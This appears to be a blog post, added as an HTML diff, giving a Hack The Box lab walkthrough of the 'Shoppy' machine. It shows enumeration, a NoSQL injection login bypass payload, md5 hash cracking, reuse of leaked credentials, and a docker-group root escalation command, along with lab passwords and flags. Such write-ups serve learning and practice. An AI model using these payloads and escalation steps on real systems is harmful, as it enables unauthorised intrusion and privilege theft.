@@ -1,0 +1,307 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <style>
+        :root {
+            --accent-color: #FF4D4D;
+        }
+    </style>
+
+    
+    
+    
+    
+    
+    
+
+    
+    <title>HTB: Shoppy</title>
+    <meta name="description" content="Standing on the shoulders of giants">
+    <meta name="keywords" content='haekal, haekal al ghifary, blog, gokarna, hugo, htb'>
+
+    <meta property="og:url" content="https://haekal-alg.github.io/posts/shoppy/">
+    <meta property="og:type" content="website">
+    <meta property="og:title" content="HTB: Shoppy">
+    <meta property="og:description" content="Standing on the shoulders of giants">
+    <meta property="og:image" content="/profile.jfif">
+
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="HTB: Shoppy">
+    <meta name="twitter:description" content="Standing on the shoulders of giants">
+    <meta property="twitter:domain" content="https://haekal-alg.github.io/posts/shoppy/">
+    <meta property="twitter:url" content="https://haekal-alg.github.io/posts/shoppy/">
+    <meta name="twitter:image" content="/profile.jfif">
+
+    
+    <link rel="canonical" href="https://haekal-alg.github.io/posts/shoppy/" />
+
+    <link rel="stylesheet" type="text/css" href="https://haekal-alg.github.io//css/normalize.min.css" media="print" onload="this.media='all'">
+    <link rel="stylesheet" type="text/css" href="https://haekal-alg.github.io//css/main.css">
+    <link disabled id="dark-theme" rel="stylesheet" href="https://haekal-alg.github.io//css/dark.css">
+
+    <script src="https://haekal-alg.github.io//js/svg-injector.min.js"></script>
+    <script src="https://haekal-alg.github.io//js/feather-icons.min.js"></script>
+    <script src="https://haekal-alg.github.io//js/main.js"></script>
+
+    
+    
+</head>
+<body>
+        <script type="text/javascript">
+            
+            setThemeByUserPref();
+        </script><header class="header">
+    <nav class="header-nav">
+
+        
+        <div class="avatar">
+            <a href="https://haekal-alg.github.io/">
+                <img src="https://haekal-alg.github.io//profile.jfif" alt="avatar" />
+            </a>
+        </div>
+        
+
+        <div class="nav-title">
+            <a class="nav-brand" href="https://haekal-alg.github.io/">haekal-alg</a>
+        </div>
+
+        <div class="nav-links">
+            
+            <div class="nav-link">
+                <a href="https://haekal-alg.github.io/posts/"><span data-feather='book'></span> Posts </a>
+            </div>
+            
+            <div class="nav-link">
+                <a href="https://haekal-alg.github.io/tags/"><span data-feather='tag'></span> Tags </a>
+            </div>
+            
+            <div class="nav-link">
+                <a href="https://github.com/haekal-alg"><span data-feather='github'></span>  </a>
+            </div>
+            
+            <div class="nav-link">
+                <a href="https://www.linkedin.com/in/haekal-alg/"><span data-feather='linkedin'></span>  </a>
+            </div>
+            
+
+            <span class="nav-icons-divider"></span>
+            <div class="nav-link dark-theme-toggle">
+                <span id="dark-theme-toggle-screen-reader-target" class="sr-only"></span>
+                <a>
+                    <span id="theme-toggle-icon" data-feather="moon"></span>
+                </a>
+            </div>
+
+            <div class="nav-link" id="hamburger-menu-toggle">
+                <span id="hamburger-menu-toggle-screen-reader-target" class="sr-only">menu</span>
+                <a>
+                    <span data-feather="menu"></span>
+                </a>
+            </div>
+
+            
+            <ul class="nav-hamburger-list visibility-hidden">
+                
+                <li class="nav-item">
+                    <a href="https://haekal-alg.github.io/posts/"><span data-feather='book'></span> Posts </a>
+                </li>
+                
+                <li class="nav-item">
+                    <a href="https://haekal-alg.github.io/tags/"><span data-feather='tag'></span> Tags </a>
+                </li>
+                
+                <li class="nav-item">
+                    <a href="https://github.com/haekal-alg"><span data-feather='github'></span>  </a>
+                </li>
+                
+                <li class="nav-item">
+                    <a href="https://www.linkedin.com/in/haekal-alg/"><span data-feather='linkedin'></span>  </a>
+                </li>
+                
+                <li class="nav-item dark-theme-toggle">
+                    <span id="dark-theme-toggle-screen-reader-target" class="sr-only">theme</span>
+                    <a>
+                        <span id="theme-toggle-icon" data-feather="moon"></span>
+                    </a>
+                </li>
+            </ul>
+
+        </div>
+    </nav>
+</header>
+<main id="content">
+    <div class="post container">
+    <div class="post-header-section">
+        <h1>HTB: Shoppy</h1>
+        <small role="doc-subtitle"></small>
+        <p class="post-date">
+            January 14, 2023
+        </p>
+
+        <ul class="post-tags">
+        
+            <li class="post-tag"><a href="https://haekal-alg.github.io/tags/htb">htb</a></li>
+        
+        </ul>
+    </div>
+
+    <div class="post-content">
+        <p>
+            <h1 id="enumeration">Enumeration</h1>
+<h2 id="nmap-scan">Nmap scan</h2>
+<pre tabindex="0"><code>$ nmap -sC -sV -oN nmap/shoppy 10.10.11.180
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 9e:5e:83:51:d9:9f:89:ea:47:1a:12:eb:81:f9:22:c0 (RSA)
+|   256 58:57:ee:eb:06:50:03:7c:84:63:d7:a3:41:5b:1a:d5 (ECDSA)
+|_  256 3e:9d:0a:42:90:44:38:60:b3:b6:2c:e9:bd:9a:67:54 (ED25519)
+80/tcp open  http    nginx 1.23.1
+|_http-server-header: nginx/1.23.1
+|_http-title: Did not follow redirect to http://shoppy.htb
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre><p>Based on the nmap scan above, port 80 redirect to <code>http://shoppy.thb</code> so I added <code>10.10.11.180 shoppy.htb</code> to <code>/etc/hosts</code>.</p>
+<h2 id="directory-enumeration">Directory enumeration</h2>
+<pre tabindex="0"><code>$ ffuf -u &#34;http://shoppy.htb/FUZZ/&#34; -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -fc 404  -t 50
+..SNIP..
+admin                   [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 435ms]
+login                   [Status: 200, Size: 1074, Words: 152, Lines: 26, Duration: 590ms]
+Admin                   [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 777ms]
+Login                   [Status: 200, Size: 1074, Words: 152, Lines: 26, Duration: 435ms]
+ADMIN                   [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 427ms]
+LOGIN                   [Status: 200, Size: 1074, Words: 152, Lines: 26, Duration: 266ms]
+:: Progress: [30000/30000] :: Job [1/1] :: 162 req/sec :: Duration: [0:03:39] :: Errors: 2 ::
+</code></pre><p>Found <code>/admin</code> and <code>/login</code> directory.</p>
+<h2 id="subdomain-enumeration">Subdomain enumeration</h2>
+<p>With <code>ffuf</code> using 50 threads I got a result in about 4 and half minutes.</p>
+<pre tabindex="0"><code>$ ffuf -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u &#34;http://shoppy.htb&#34; -H &#34;Host: FUZZ.shoppy.htb&#34; -fc 301 -t 50
+..SNIP..
+mattermost              [Status: 200, Size: 3122, Words: 141, Lines: 1, Duration: 266ms]
+</code></pre><p>Found <code>http://mattermost.shoppy.htb</code> -&gt; visitting home page will redirect to login page.</p>
+<h1 id="web-exploitation">Web Exploitation</h1>
+<h2 id="auth-bypass-with-nosql-injection">Auth bypass with NoSQL injection</h2>
+<p>The login page on <code>shoppy.htb</code> is vulnerable to NoSQL injection. I used <code>admin' || '1==1</code> as payload to bypass the authentication and login as user admin.</p>
+<p><img src="/shoppy/Pasted%20image%2020230114155853.png" alt=""></p>
+<p><img src="/shoppy/Pasted%20image%2020230114155918.png" alt=""></p>
+<p>I tested the same payload to the search functionality and it also worked.</p>
+<p><img src="/shoppy/Pasted%20image%2020230114160020.png" alt=""></p>
+<p>I was able to leak all user data.</p>
+<p><img src="/shoppy/Pasted%20image%2020230114160101.png" alt=""></p>
+<p>The password seemed to had been hashed using md5. <a href="https://crackstation.net/">cracksation</a> is an excellent website for this. They have billions of look up tables and can crack md5 hashes in an instant.</p>
+<p><img src="/shoppy/Pasted%20image%2020230113145253.png" alt=""></p>
+<p>The credentials didn&rsquo;t work for <code>ssh</code> but it did work for the subdomain we found earlier.</p>
+<pre tabindex="0"><code>username: josh
+password: remembermethisway
+</code></pre><p><img src="/shoppy/Pasted%20image%2020230114163326.png" alt=""></p>
+<p>There was a credential left in the channel <code>deployment</code>.</p>
+<p><img src="/shoppy/Pasted%20image%2020230113165058.png" alt=""></p>
+<pre tabindex="0"><code>username: jaeger
+password: Sh0ppyBest@pp!
+</code></pre><p>Now that one worked in <code>ssh</code>.</p>
+<pre tabindex="0"><code>$ ssh jaeger@10.10.11.180 
+jaeger@10.10.11.180&#39;s password: 
+Linux shoppy 5.10.0-18-amd64 #1 SMP Debian 5.10.140-1 (2022-09-02) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Sat Jan 14 02:47:13 2023 from 10.10.14.36
+jaeger@shoppy:~$ cat user.txt 
+c82e559f05cb5679c29b5709f6572a73
+</code></pre><h1 id="privilege-escalation">Privilege Escalation</h1>
+<h2 id="unlocking-password-manager">Unlocking password manager</h2>
+<p>User <code>jaeger</code> can execute an ELF binary named <code>password-manager</code> as user <code>deploy</code>.</p>
+<pre tabindex="0"><code>jaeger@shoppy:/home/deploy$ sudo -l
+Matching Defaults entries for jaeger on shoppy:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User jaeger may run the following commands on shoppy:
+    (deploy) /home/deploy/password-manager
+</code></pre><p>The binary itself read the content of <code>/home/deploy/creds.txt</code> if supplied the correct master password.</p>
+<pre tabindex="0"><code>jaeger@shoppy:/home/deploy$ sudo -u deploy strings ./password-manager                                                                                                                                                                      
+..SNIP..                                                                                                                                                                                                                             
+Welcome to Josh password manager!                                                                                                                                                                                                          
+Please enter your master password:                                                                                                                                                                                                         
+Access granted! Here is creds !                                                                                                                                                                                                            
+cat /home/deploy/creds.txt                                                                                                                                                                                                                 
+Access denied! This incident will be reported !                                                                                                                                                                                            
+;*3$&#34;                                                                                                                                                                                                                                      
+zPLR                                 
+..SNIP...
+</code></pre><p>I copied the binary to my machine using <code>scp</code> and inspected it using <code>Ghidra</code>.</p>
+<p><img src="/shoppy/Pasted%20image%2020230114151225.png" alt=""></p>
+<p>Turned out the master password was simply &ldquo;Sample&rdquo;.</p>
+<p>Note: you can easily found the master password using <code>cat</code> since text was declared plainly. I choose the buldozer option of using <code>Ghidra</code> since I didn&rsquo;t found the password with <code>strings</code>.  I didn&rsquo;t use <code>cat</code> either because I thought  &ldquo;since <code>strings</code> doesn&rsquo;t work, <code>cat</code> wouldn&rsquo;t either&rdquo;. Could&rsquo;ve saved me 15 minutes.</p>
+<pre tabindex="0"><code>jaeger@shoppy:/home/deploy$ sudo -u deploy ./password-manager
+Welcome to Josh password manager!
+Please enter your master password: Sample
+Access granted! Here is creds !
+Deploy Creds :
+username: deploy
+password: Deploying@pp!
+jaeger@shoppy:/home/deploy$ su deployPassword: 
+$ bash
+deploy@shoppy:~$ 
+</code></pre><h2 id="exploiting-docker">Exploiting docker</h2>
+<p>Using <code>id</code> I found out that user <code>deploy</code> is in group <code>docker</code>.</p>
+<pre tabindex="0"><code>deploy@shoppy:~$ id
+uid=1001(deploy) gid=1001(deploy) groups=1001(deploy),998(docker)
+</code></pre><p>By default docker is ran by root. We can leverage this group permission to <a href="https://gtfobins.github.io/gtfobins/docker/">spawn a root shell in the container</a> by using <code>docker run</code>.</p>
+<pre tabindex="0"><code>deploy@shoppy:~$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+# id
+uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
+# cat /root/root.txt
+60481f011d33c3d2b8529a34ba9b1229
+</code></pre>
+        </p>
+    </div>
+
+    <div class="prev-next">
+        
+    </div>
+</div>
+
+<aside class="post-toc">
+    <nav id="toc">
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#enumeration">Enumeration</a>
+      <ul>
+        <li><a href="#nmap-scan">Nmap scan</a></li>
+        <li><a href="#directory-enumeration">Directory enumeration</a></li>
+        <li><a href="#subdomain-enumeration">Subdomain enumeration</a></li>
+      </ul>
+    </li>
+    <li><a href="#web-exploitation">Web Exploitation</a>
+      <ul>
+        <li><a href="#auth-bypass-with-nosql-injection">Auth bypass with NoSQL injection</a></li>
+      </ul>
+    </li>
+    <li><a href="#privilege-escalation">Privilege Escalation</a>
+      <ul>
+        <li><a href="#unlocking-password-manager">Unlocking password manager</a></li>
+        <li><a href="#exploiting-docker">Exploiting docker</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+    </nav>
+</aside>
+
+
+
+    
+
+        </main><footer class="footer">
+    
+    <span>
+        
+    </span>
+</footer>
+</body>
+</html>
